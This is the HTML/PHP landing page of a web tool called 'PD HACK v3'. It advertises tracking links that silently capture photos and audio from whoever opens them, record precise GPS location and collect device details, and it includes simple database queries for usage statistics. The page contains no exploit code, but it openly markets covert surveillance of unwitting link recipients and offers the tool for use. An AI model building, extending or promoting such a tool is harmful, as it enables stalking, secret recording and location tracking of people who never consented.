<div class="relative overflow-hidden bg-gradient-to-br from-slate-900 via-indigo-900 to-slate-900 pt-20 pb-32">
    <!-- Animated Background -->
    <div class="absolute inset-0 overflow-hidden pointer-events-none">
        <div class="absolute top-0 left-1/4 w-96 h-96 bg-indigo-500/20 blur-3xl rounded-full animate-pulse"></div>
        <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-purple-500/20 blur-3xl rounded-full animate-pulse [animation-delay:1s]"></div>
        <div class="absolute top-1/2 right-0 w-96 h-96 bg-blue-500/10 blur-3xl rounded-full animate-pulse [animation-delay:2s]"></div>
    </div>

    <div class="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <!-- Badge -->
        <div class="flex justify-center mb-8">
            <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/10 border border-white/20 text-white text-sm font-bold backdrop-blur-sm hover:bg-white/20 transition-all">
                <span class="flex h-2 w-2 rounded-full bg-emerald-400 animate-pulse"></span>
                ✨ PD HACK v3 - Advanced Intelligence Platform
            </div>
        </div>
        
        <!-- Hero Section -->
        <div class="text-center mb-16">
            <h1 class="text-6xl md:text-7xl lg:text-8xl font-black text-white tracking-tighter mb-6 leading-tight">
                Powerful Data<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-400">Intelligence</span>
            </h1>
            
            <p class="max-w-3xl mx-auto text-lg md:text-xl text-gray-300 mb-12 leading-relaxed font-medium">
                Create smart tracking links to capture high-resolution media, precise location data, and comprehensive device analytics. The ultimate data collection platform for professionals.
            </p>
            
            <!-- CTA Buttons -->
            <div class="flex flex-col sm:flex-row items-center justify-center gap-4 mb-20">
                <a href="?page=register" class="w-full sm:w-auto px-10 py-4 bg-gradient-to-r from-indigo-600 to-purple-600 text-white rounded-2xl font-extrabold text-lg shadow-2xl shadow-indigo-500/50 hover:shadow-indigo-500/70 hover:scale-105 transition-all flex items-center justify-center gap-2">
                    <i class="fas fa-rocket"></i>
                    Get Started Free
                </a>
                <a href="?page=login" class="w-full sm:w-auto px-10 py-4 bg-white/10 text-white border border-white/30 rounded-2xl font-extrabold text-lg hover:bg-white/20 backdrop-blur-sm transition-all flex items-center justify-center gap-2">
                    <i class="fas fa-sign-in-alt"></i>
                    Sign In
                </a>
            </div>
        </div>

        <!-- Stats Grid -->
        <?php
        // Get real statistics from database
        $total_users = $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn() ?? 0;
        $total_links = $pdo->query("SELECT COUNT(*) FROM links")->fetchColumn() ?? 0;
        ?>
        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-6 max-w-5xl mx-auto mb-20">
            <div class="p-6 bg-white/5 border border-white/10 rounded-3xl backdrop-blur-sm hover:bg-white/10 transition-all">
                <p class="text-4xl font-black text-white mb-2"><?= number_format($total_users) ?></p>
                <p class="text-sm font-semibold text-gray-400">Active Users</p>
            </div>
            <div class="p-6 bg-white/5 border border-white/10 rounded-3xl backdrop-blur-sm hover:bg-white/10 transition-all">
                <p class="text-4xl font-black text-white mb-2"><?= number_format($total_links) ?></p>
                <p class="text-sm font-semibold text-gray-400">Links Created</p>
            </div>
            <div class="p-6 bg-white/5 border border-white/10 rounded-3xl backdrop-blur-sm hover:bg-white/10 transition-all">
                <p class="text-4xl font-black text-white mb-2">99.9%</p>
                <p class="text-sm font-semibold text-gray-400">Uptime</p>
            </div>
            <div class="p-6 bg-white/5 border border-white/10 rounded-3xl backdrop-blur-sm hover:bg-white/10 transition-all">
                <p class="text-4xl font-black text-white mb-2">256-bit</p>
                <p class="text-sm font-semibold text-gray-400">Encryption</p>
            </div>
        </div>
    </div>

    <!-- Features Section -->
    <div class="relative mt-32 pt-32 border-t border-white/10">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="text-center mb-20">
                <h2 class="text-4xl md:text-5xl font-black text-white mb-6">Powerful Features</h2>
                <p class="text-lg text-gray-400 font-medium max-w-2xl mx-auto">Everything you need to gather intelligence effectively and securely.</p>
            </div>
            
            <div class="grid md:grid-cols-3 gap-8">
                <!-- Feature 1 -->
                <div class="group p-8 bg-white/5 border border-white/10 rounded-3xl backdrop-blur-sm hover:bg-white/10 hover:border-indigo-400/50 transition-all">
                    <div class="w-16 h-16 bg-gradient-to-br from-indigo-500 to-indigo-600 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-110 transition-transform shadow-lg shadow-indigo-500/20">
                        <i class="fas fa-camera text-2xl text-white"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-white mb-3">Silent Capture</h3>
                    <p class="text-gray-400 leading-relaxed">Capture high-resolution photos and audio recordings with advanced web technology. Multiple frame capture for comprehensive coverage.</p>
                </div>
                
                <!-- Feature 2 -->
                <div class="group p-8 bg-white/5 border border-white/10 rounded-3xl backdrop-blur-sm hover:bg-white/10 hover:border-purple-400/50 transition-all">
                    <div class="w-16 h-16 bg-gradient-to-br from-purple-500 to-purple-600 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-110 transition-transform shadow-lg shadow-purple-500/20">
                        <i class="fas fa-location-dot text-2xl text-white"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-white mb-3">GPS Tracking</h3>
                    <p class="text-gray-400 leading-relaxed">Get precise GPS coordinates with altitude and accuracy data. Real-time location mapping and comprehensive history logs.</p>
                </div>
                
                <!-- Feature 3 -->
                <div class="group p-8 bg-white/5 border border-white/10 rounded-3xl backdrop-blur-sm hover:bg-white/10 hover:border-blue-400/50 transition-all">
                    <div class="w-16 h-16 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-110 transition-transform shadow-lg shadow-blue-500/20">
                        <i class="fas fa-microchip text-2xl text-white"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-white mb-3">Device Intel</h3>
                    <p class="text-gray-400 leading-relaxed">Gather comprehensive device intelligence including OS, browser, battery status, network type, and screen specifications.</p>
                </div>
            </div>

            <!-- Additional Features -->
            <div class="grid md:grid-cols-2 gap-8 mt-12">
                <div class="p-8 bg-gradient-to-br from-indigo-500/10 to-purple-500/10 border border-indigo-400/20 rounded-3xl">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-12 h-12 bg-indigo-600 rounded-xl flex items-center justify-center">
                            <i class="fas fa-lock text-white"></i>
                        </div>
                        <h4 class="text-xl font-bold text-white">End-to-End Encryption</h4>
                    </div>
                    <p class="text-gray-400">All data is encrypted with military-grade 256-bit encryption for maximum security.</p>
                </div>

                <div class="p-8 bg-gradient-to-br from-purple-500/10 to-pink-500/10 border border-purple-400/20 rounded-3xl">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-12 h-12 bg-purple-600 rounded-xl flex items-center justify-center">
                            <i class="fas fa-chart-line text-white"></i>
                        </div>
                        <h4 class="text-xl font-bold text-white">Real-Time Analytics</h4>
                    </div>
                    <p class="text-gray-400">Monitor all captured data in real-time with detailed analytics and insights.</p>
                </div>
            </div>
        </div>
    </div>
</div>
